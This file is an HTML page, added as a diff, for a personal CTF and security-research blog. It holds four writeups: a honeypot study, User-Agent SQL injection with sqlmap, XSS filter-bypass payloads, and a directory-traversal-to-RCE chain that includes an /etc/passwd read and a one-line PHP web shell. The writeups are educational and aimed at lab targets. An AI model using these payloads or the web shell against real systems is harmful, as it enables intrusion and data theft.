@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeups | Security Research Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0f0f0f;
+            --bg-secondary: #1a1a1a;
+            --bg-tertiary: #262626;
+            --text-primary: #e0e0e0;
+            --text-secondary: #a0a0a0;
+            --accent: #00d4aa;
+            --accent-dim: #00b494;
+            --border: #333;
+            --shadow: rgba(0, 0, 0, 0.3);
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .header {
+            background-color: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--accent);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 4rem 0;
+            text-align: center;
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-primary) 100%);
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, var(--accent), #00ff88);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Filters */
+        .filters {
+            padding: 2rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .filter-group {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .filter-label {
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .filter-btn {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            background: var(--accent);
+            color: var(--bg-primary);
+            border-color: var(--accent);
+        }
+
+        /* Writeups Grid */
+        .writeups {
+            padding: 3rem 0;
+        }
+
+        .writeups-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+        }
+
+        .writeup-card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+        }
+
+        .writeup-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px var(--shadow);
+        }
+
+        .writeup-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .writeup-category {
+            background: var(--accent);
+            color: var(--bg-primary);
+            padding: 0.25rem 0.75rem;
+            border-radius: 1rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .writeup-date {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .writeup-title {
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+            color: var(--text-primary);
+        }
+
+        .writeup-event {
+            color: var(--accent);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .writeup-excerpt {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            overflow-y: auto;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            margin: 2rem auto;
+            padding: 0;
+            max-width: 900px;
+            border-radius: 0.75rem;
+            position: relative;
+        }
+
+        .modal-header {
+            padding: 2rem 2rem 1rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1.5rem;
+            background: none;
+            border: none;
+            font-size: 2rem;
+            color: var(--text-secondary);
+            cursor: pointer;
+        }
+
+        .modal-close:hover {
+            color: var(--accent);
+        }
+
+        .modal-body {
+            padding: 2rem;
+            max-height: 70vh;
+            overflow-y: auto;
+        }
+
+        .modal-body h2 {
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+
+        .modal-body h3 {
+            color: var(--text-primary);
+            margin: 1.5rem 0 0.5rem;
+        }
+
+        .modal-body p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .modal-body code {
+            background: var(--bg-tertiary);
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.25rem;
+            font-size: 0.9rem;
+        }
+
+        .modal-body pre {
+            background: var(--bg-primary);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            padding: 2rem 0;
+            text-align: center;
+            color: var(--text-secondary);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .nav {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .writeups-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .modal-content {
+                margin: 1rem;
+                max-width: calc(100% - 2rem);
+            }
+
+            .modal-body {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<!-- Header -->
+<header class="header">
+    <div class="container">
+        <nav class="nav">
+            <a href="#" class="logo">{ CTF Writeups }</a>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#writeups">Writeups</a></li>
+                <li><a href="#about">About</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<!-- Hero Section -->
+<section class="hero" id="home">
+    <div class="container">
+        <h1>Security Research & CTF Writeups</h1>
+        <p>Documenting my journey through cybersecurity challenges, vulnerability research, and real-world attack analysis</p>
+    </div>
+</section>
+
+<!-- Filters -->
+<section class="filters">
+    <div class="container">
+        <div class="filter-group">
+            <span class="filter-label">Filter by:</span>
+            <button class="filter-btn active" data-filter="all">All</button>
+            <button class="filter-btn" data-filter="web">Web</button>
+            <button class="filter-btn" data-filter="crypto">Crypto</button>
+            <button class="filter-btn" data-filter="pwn">Pwn</button>
+            <button class="filter-btn" data-filter="forensics">Forensics</button>
+            <button class="filter-btn" data-filter="research">Research</button>
+        </div>
+    </div>
+</section>
+
+<!-- Writeups -->
+<section class="writeups" id="writeups">
+    <div class="container">
+        <div class="writeups-grid" id="writeups-grid">
+            <!-- Writeup cards will be populated by JavaScript -->
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="container">
+        <p>&copy; 2025 CTF Writeups. Built for security research and learning.</p>
+    </div>
+</footer>
+
+<!-- Modal -->
+<div class="modal" id="writeup-modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <button class="modal-close" onclick="closeModal()">&times;</button>
+            <h2 id="modal-title"></h2>
+            <div id="modal-meta"></div>
+        </div>
+        <div class="modal-body" id="modal-body">
+            <!-- Content will be populated by JavaScript -->
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+<script>
+    // Sample writeup data
+    const writeups = [
+        {
+            id: 1,
+            title: "30-Day Honeypot Experiment: What I Learned",
+            category: "research",
+            event: "Personal Research Project",
+            date: "2025-07-11",
+            excerpt: "Deployed a Cowrie SSH honeypot for 30 days and captured 47,143 attack events from 3,608 unique IPs. Discovered the difference between malicious attacks and legitimate security research.",
+            content: `
+                    <h2>Introduction</h2>
+                    <p>Hello! This is my first blog post, documenting my month-long honeypot experiment. On June 11th, 2025, I decided to set up a honeypot to witness real-world cyberattacks. As a cybersecurity student, it's rare to see genuine attacks outside of controlled lab environments.</p>
+
+                    <h3>The Setup</h3>
+                    <p>Using Cowrie (an open-source SSH honeypot) deployed on a free Oracle Cloud VM, I created what appeared to be a vulnerable SSH server. Over 30 days, my little project attracted <strong>3,608 unique IP addresses</strong> generating <strong>47,143 total events</strong>.</p>
+
+                    <h3>Key Findings</h3>
+                    <p>The moment I realized I was dealing with something bigger compared to random hackers and script kiddies was when I was attacked by 23 IP addresses across the world. One particular attack stood out immediately.</p>
+
+                    <p>A single IP address (8.222.248.149) hammered my honeypot with 29,912 events over 19 hours - averaging one attack every 2.3 seconds. The attacker systematically brute-forced login credentials, and once they gained access, they ran a strange command:</p>
+
+                    <pre><code class="language-bash">echo -e "\\x6F\\x6B"</code></pre>
+
+                    <p>At first, it looked like gibberish but when decoded, those hexadecimal characters spell "Ok". It was a simple way to test if shell access was successful while evading basic detection systems.</p>
+
+                    <h3>Legitimate vs Malicious Traffic</h3>
+                    <p>Initially, I assumed every IP scanning my honeypot was malicious. However, further investigation showed something interesting: some of these "attackers" were actually legitimate security researchers. IPs belonging to Censys, Shodan, and Shadowserver appeared in my logs.</p>
+
+                    <p>This taught me the importance of distinguishing between legitimate security research and actual threats when analyzing attack data.</p>
+
+                    <h3>Attack Patterns</h3>
+                    <p>Most attacks were credential stuffing and probing, with a total of 3,736 echo commands to test shell access. The top username attempted was "root", showing that attackers target the most obvious administrative accounts first.</p>
+                `
+        },
+        {
+            id: 2,
+            title: "SQL Injection via User-Agent Header",
+            category: "web",
+            event: "HackTheBox - WebApp Challenge",
+            date: "2025-06-15",
+            excerpt: "Found an interesting SQL injection vulnerability hidden in the User-Agent header parsing. The application was logging user agents to a database without proper sanitization.",
+            content: `
+                    <h2>Challenge Overview</h2>
+                    <p>This web application challenge involved finding and exploiting a SQL injection vulnerability in an unexpected location - the User-Agent header.</p>
+
+                    <h3>Initial Reconnaissance</h3>
+                    <p>The target was a simple login portal with basic functionality. Standard SQL injection attempts on the login form yielded no results, suggesting proper input sanitization on user-facing forms.</p>
+
+                    <h3>Discovery</h3>
+                    <p>While testing various attack vectors, I noticed that the application seemed to be logging requests. This led me to investigate whether HTTP headers were being processed and stored in a database.</p>
+
+                    <pre><code class="language-http">GET /login HTTP/1.1
+Host: target.htb
+User-Agent: ' OR 1=1--</code></pre>
+
+                    <p>Bingo! The application threw a SQL error, revealing that the User-Agent header was being inserted directly into a SQL query without sanitization.</p>
+
+                    <h3>Exploitation</h3>
+                    <p>Using sqlmap with custom headers:</p>
+
+                    <pre><code class="language-bash">sqlmap -u "http://target.htb/login" \\
+    --header="User-Agent: *" \\
+    --level=3 \\
+    --risk=2 \\
+    --batch</code></pre>
+
+                    <p>This successfully identified the injection point and allowed for data extraction from the underlying database.</p>
+
+                    <h3>Key Takeaway</h3>
+                    <p>Always test HTTP headers for injection vulnerabilities, especially in applications that log or process request metadata. Developers often sanitize user input but forget about headers.</p>
+                `
+        },
+        {
+            id: 3,
+            title: "XSS in PDF Generation Service",
+            category: "web",
+            event: "Bug Bounty - Private Program",
+            date: "2025-05-20",
+            excerpt: "Discovered a stored XSS vulnerability in a PDF generation service that was processing HTML content without proper sanitization before converting to PDF.",
+            content: `
+                    <h2>Target Application</h2>
+                    <p>The target was a document management system that allowed users to create and convert documents to PDF format. Users could input HTML content that would be rendered and converted to PDF.</p>
+
+                    <h3>Initial Testing</h3>
+                    <p>I started by testing basic XSS payloads in the HTML input field:</p>
+
+                    <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+
+                    <p>The payload was filtered out, indicating some form of input sanitization was in place.</p>
+
+                    <h3>Bypass Techniques</h3>
+                    <p>After trying various bypass techniques, I discovered that the application was using a whitelist approach but missed some HTML5 event handlers:</p>
+
+                    <pre><code class="language-html">&lt;svg onload=alert(1)&gt;</code></pre>
+
+                    <p>This payload successfully executed JavaScript during the PDF generation process.</p>
+
+                    <h3>Impact Assessment</h3>
+                    <p>The XSS was particularly dangerous because:</p>
+                    <ul>
+                        <li>It executed in the context of the PDF generation service</li>
+                        <li>Could potentially access internal network resources</li>
+                        <li>The generated PDFs could be shared, spreading the attack</li>
+                    </ul>
+
+                    <h3>Remediation</h3>
+                    <p>The fix involved implementing a proper HTML sanitization library and using a more restrictive Content Security Policy during PDF generation.</p>
+                `
+        },
+        {
+            id: 4,
+            title: "Directory Traversal to RCE",
+            category: "web",
+            event: "CTF Challenge - CyberDefenders",
+            date: "2025-04-10",
+            excerpt: "Exploited a directory traversal vulnerability in a file upload feature to achieve remote code execution by uploading a PHP shell to a predictable location.",
+            content: `
+                    <h2>Challenge Setup</h2>
+                    <p>The challenge presented a web application with file upload functionality that claimed to only allow image uploads.</p>
+
+                    <h3>Initial Analysis</h3>
+                    <p>Testing the upload functionality revealed that it checked file extensions but didn't validate the actual file content. However, uploaded files were stored outside the web root.</p>
+
+                    <h3>Finding the Vulnerability</h3>
+                    <p>While exploring the application, I discovered a directory traversal vulnerability in the file viewing functionality:</p>
+
+                    <pre><code class="language-http">GET /view?file=../../../etc/passwd HTTP/1.1</code></pre>
+
+                    <p>This successfully returned the system's password file, confirming the traversal vulnerability.</p>
+
+                    <h3>Exploitation Chain</h3>
+                    <p>1. Upload a PHP shell disguised as an image:</p>
+
+                    <pre><code class="language-bash">curl -X POST -F "file=@shell.php.png" http://target/upload</code></pre>
+
+                    <p>2. Use directory traversal to access the uploaded shell:</p>
+
+                    <pre><code class="language-http">GET /view?file=../uploads/shell.php.png&cmd=whoami HTTP/1.1</code></pre>
+
+                    <p>3. Execute commands through the shell parameter:</p>
+
+                    <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                    <h3>Lessons Learned</h3>
+                    <p>This challenge highlighted the importance of:</p>
+                    <ul>
+                        <li>Validating file content, not just extensions</li>
+                        <li>Implementing proper path sanitization</li>
+                        <li>Storing uploads outside the web root with proper access controls</li>
+                    </ul>
+                `
+        }
+    ];
+
+    // DOM elements
+    const writeupsGrid = document.getElementById('writeups-grid');
+    const modal = document.getElementById('writeup-modal');
+    const modalTitle = document.getElementById('modal-title');
+    const modalMeta = document.getElementById('modal-meta');
+    const modalBody = document.getElementById('modal-body');
+
+    // Current filter
+    let currentFilter = 'all';
+
+    // Initialize the page
+    function init() {
+        renderWriteups();
+        setupFilters();
+    }
+
+    // Render writeups based on current filter
+    function renderWriteups() {
+        const filteredWriteups = currentFilter === 'all'
+            ? writeups
+            : writeups.filter(w => w.category === currentFilter);
+
+        writeupsGrid.innerHTML = '';
+
+        filteredWriteups.forEach(writeup => {
+            const card = createWriteupCard(writeup);
+            writeupsGrid.appendChild(card);
+        });
+    }
+
+    // Create a writeup card element
+    function createWriteupCard(writeup) {
+        const card = document.createElement('div');
+        card.className = 'writeup-card';
+        card.onclick = () => openModal(writeup);
+
+        const categoryColors = {
+            web: '#ff6b6b',
+            crypto: '#4ecdc4',
+            pwn: '#45b7d1',
+            forensics: '#96ceb4',
+            research: '#ffeaa7'
+        };
+
+        card.innerHTML = `
+                <div class="writeup-meta">
+                    <span class="writeup-category" style="background-color: ${categoryColors[writeup.category] || '#00d4aa'}">${writeup.category.toUpperCase()}</span>
+                    <span class="writeup-date">${formatDate(writeup.date)}</span>
+                </div>
+                <h3 class="writeup-title">${writeup.title}</h3>
+                <div class="writeup-event">${writeup.event}</div>
+                <p class="writeup-excerpt">${writeup.excerpt}</p>
+            `;
+
+        return card;
+    }
+
+    // Setup filter buttons
+    function setupFilters() {
+        const filterBtns = document.querySelectorAll('.filter-btn');
+        filterBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                // Remove active class from all buttons
+                filterBtns.forEach(b => b.classList.remove('active'));
+                // Add active class to clicked button
+                btn.classList.add('active');
+                // Update current filter
+                currentFilter = btn.dataset.filter;
+                // Re-render writeups
+                renderWriteups();
+            });
+        });
+    }
+
+    // Open modal with writeup content
+    function openModal(writeup) {
+        modalTitle.textContent = writeup.title;
+        modalMeta.innerHTML = `
+                <div style="display: flex; gap: 1rem; margin-top: 0.5rem; align-items: center;">
+                    <span class="writeup-category" style="font-size: 0.8rem;">${writeup.category.toUpperCase()}</span>
+                    <span class="writeup-event" style="color: var(--accent);">${writeup.event}</span>
+                    <span class="writeup-date" style="color: var(--text-secondary);">${formatDate(writeup.date)}</span>
+                </div>
+            `;
+        modalBody.innerHTML = writeup.content;
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
+
+        // Re-run Prism highlighting on new content
+        if (window.Prism) {
+            Prism.highlightAllUnder(modalBody);
+        }
+    }
+
+    // Close modal
+    function closeModal() {
+        modal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    }
+
+    // Format date
+    function formatDate(dateString) {
+        const date = new Date(dateString);
+        return date.toLocaleDateString('en-US', {
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric'
+        });
+    }
+
+    // Close modal when clicking outside
+    window.onclick = function(event) {
+        if (event.target === modal) {
+            closeModal();
+        }
+    }
+
+    // Smooth scrolling for navigation links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+            e.preventDefault();
+            const target = document.querySelector(this.getAttribute('href'));
+            if (target) {
+                target.scrollIntoView({
+                    behavior: 'smooth'
+                });
+            }
+        });
+    });
+
+    // Initialize the page when DOM is loaded
+    document.addEventListener('DOMContentLoaded', init);
+</script>
+</body>
+</html>
